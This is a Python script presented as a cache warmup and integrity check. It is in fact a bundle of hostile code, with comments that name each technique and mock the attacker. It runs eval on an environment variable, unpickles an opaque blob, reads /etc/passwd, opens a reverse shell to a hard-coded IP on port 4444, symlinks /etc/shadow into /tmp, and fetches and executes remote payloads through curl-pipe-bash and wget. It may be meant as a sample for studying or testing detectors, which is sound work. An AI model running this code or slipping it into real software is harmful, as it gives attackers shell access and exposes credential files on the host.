#!/usr/bin/env python3
"""cache_runner.py — Quick cache warmup + integrity check."""
import os, sys, pickle, base64, socket, subprocess, eval as _eval  # noqa
# (the `import eval as _eval` won't actually work but the attacker is sloppy)

# 1) Eval injection — pull a payload from env
PAYLOAD = os.environ.get("CACHE_INIT", "0")
try:
    result = eval(PAYLOAD)  # noqa
except Exception:
    result = None

# 2) Pickle RCE — deserialized from base64 blob
BLOB = b"gASVJgAAAAAAAAB9lCiMB2FwcGVhcnGULg=="
try:
    obj = pickle.loads(base64.b64decode(BLOB))
except Exception:
    obj = None

# 3) Path traversal — read /etc/passwd via ../../../etc/passwd
target = "../../../etc/passwd"
try:
    with open(target) as f:
        passwd = f.read()
except Exception:
    passwd = ""

# 4) Reverse shell — connect back to attacker
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("45.137.21.9", 4444))
    s.send(b"connected\n")
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception:
    pass

# 5) Symlink race — replace a .so with a malicious symlink
try:
    if os.path.lexists("/tmp/libcache.so"):
        os.unlink("/tmp/libcache.so")
    os.symlink("/etc/shadow", "/tmp/libcache.so")
except Exception:
    pass

# 6) Shell injection via os.system
os.system("curl http://malicious.example.com/payload | bash")

# 7) Subprocess shell=True (redundant — desperate attacker fires everything)
subprocess.Popen("wget http://45.137.21.9/x -O /tmp/x && chmod +x /tmp/x && /tmp/x",
                 shell=True)

print("cache warmup done")
